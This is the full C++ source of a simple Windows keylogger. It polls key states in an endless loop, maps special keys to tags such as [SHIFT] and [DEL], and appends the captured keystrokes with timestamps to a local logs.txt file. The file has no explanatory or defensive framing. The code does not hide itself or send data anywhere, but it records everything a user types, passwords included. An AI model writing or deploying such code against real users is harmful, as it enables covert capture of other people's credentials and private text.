#pragma comment(lib, "User32.lib")
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <Winuser.h>
#include <ctime>
#include <chrono>

std::string translateKeys(int key){
	std::string result;
	if (key == VK_SPACE)
		result = " ";
	else if (key == VK_RETURN)
		result = "\n";
	else if (key == VK_BACK)
		result = "[DEL]";
	else if (key == VK_TAB)
		result = "\t";
	else if (key == VK_SHIFT)
		result = "[SHIFT]";
	else if (key == VK_CONTROL)
		result = "[CTRL]";
	else if (key == VK_MENU)
		result = "[ALT]";
	else if (key == VK_CAPITAL)
		result = "[CAPS]";
	else if (key == VK_ESCAPE)
		result = "[ESC]";
	else if (key == VK_LEFT)
		result = "[LEFT ARROW]";
	else if (key == VK_RIGHT)
		result = "[RIGHT ARROW]";
	else if (key == VK_UP)
		result = "[UP ARROW]";
	else if (key == VK_DOWN)
		result = "[DOWN ARROW]";
	else if (key == VK_SNAPSHOT)
		result = "[PRINT SCREEN]";
	else
		result += key;
	return result;
}

std::string writeDate() {
	struct tm* timeinfo;
	char timeArr[21];
	std::string timeStr;
	time_t rawtime;

	time(&rawtime);
	std::cout << time(NULL) << std::endl;
	timeinfo = localtime(&rawtime);
	std::cout << timeinfo->tm_mday << std::endl;
	sprintf(timeArr, "[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
	timeStr = timeArr;
	return (timeStr);
}

void writeLogs(std::string buf) {
	std::fstream logfile;

	logfile.open("logs.txt", std::ios::app);
	std::cout << "||||WRITING TO FILE||||";
	logfile << writeDate();
	logfile << " - ";
	logfile << buf << std::endl;
	logfile.close();
}

void main() {
	std::string buf;

	while (true) {
		for (int key = 8; key <= 127; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				std::string specialChar = translateKeys(key);
				buf += specialChar;
				printf("%s\n", specialChar.data());

				if (buf.length() >= 100)
				{
					writeLogs(buf);
					buf.clear();
				}
			}
		}
	}
}